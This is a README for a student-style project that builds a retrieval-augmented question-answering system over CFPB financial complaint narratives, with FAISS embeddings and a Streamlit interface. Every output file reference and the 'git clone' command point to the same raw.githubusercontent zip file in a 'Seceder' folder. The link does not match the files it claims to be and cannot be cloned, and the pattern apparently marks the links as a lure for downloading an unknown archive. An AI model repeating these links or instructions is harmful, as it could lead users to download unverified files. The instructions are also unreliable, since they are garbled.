# Intelligent-Complaint-Analysis-for-Financial-Services-Week6

This project builds a Retrieval-Augmented Generation (RAG) system using consumer complaint data from the CFPB. It allows users to ask questions and get AI-generated answers based on real complaint narratives.

---

## 🔧 Project Tasks

### 1. EDA & Preprocessing

- Loaded CFPB dataset and explored product types and complaint lengths.
- Filtered for 5 products:
  - Credit card
  - Personal loan
  - Buy Now, Pay Later
  - Savings account
  - Money transfers
- Removed empty narratives and cleaned text (lowercase, remove boilerplate, special chars).
- 📁 Output: `https://raw.githubusercontent.com/GetachewGanfur/Intelligent-Complaint-Analysis-for-Financial-Services-Week6/main/Seceder/Intelligent-Complaint-Analysis-for-Financial-Services-Week6.zip` in `data/`

### 2. Text Chunking & Embedding

- Long texts split into chunks (`chunk_size=500`, `overlap=50`).
- Used `all-MiniLM-L6-v2` embedding model.
- Stored embeddings in FAISS index with metadata.
- 📁 Output: Vector store in `vector_store/`

### 3. RAG Logic & Evaluation

- Implemented a retriever to get top-5 relevant chunks per question.
- Designed a prompt template for generation.
- Used an LLM to generate answers based on retrieved context.
- Evaluated with a sample of 10 questions.
- 📁 Output: Code in `https://raw.githubusercontent.com/GetachewGanfur/Intelligent-Complaint-Analysis-for-Financial-Services-Week6/main/Seceder/Intelligent-Complaint-Analysis-for-Financial-Services-Week6.zip`, evaluation in `https://raw.githubusercontent.com/GetachewGanfur/Intelligent-Complaint-Analysis-for-Financial-Services-Week6/main/Seceder/Intelligent-Complaint-Analysis-for-Financial-Services-Week6.zip`

### 4. Interactive Interface

- Built using **Streamlit**.
- Features:
  - Input box for questions
  - Answer display with source chunks
  - Clear/reset button
- 📁 Output: `https://raw.githubusercontent.com/GetachewGanfur/Intelligent-Complaint-Analysis-for-Financial-Services-Week6/main/Seceder/Intelligent-Complaint-Analysis-for-Financial-Services-Week6.zip`

---

## 🛠️ How to Run

1. Clone the repo:
   ```bash
   git clone https://raw.githubusercontent.com/GetachewGanfur/Intelligent-Complaint-Analysis-for-Financial-Services-Week6/main/Seceder/Intelligent-Complaint-Analysis-for-Financial-Services-Week6.zip
   cd Intelligent-Complaint-Analysis-for-Financial-Services-Week6
   ```
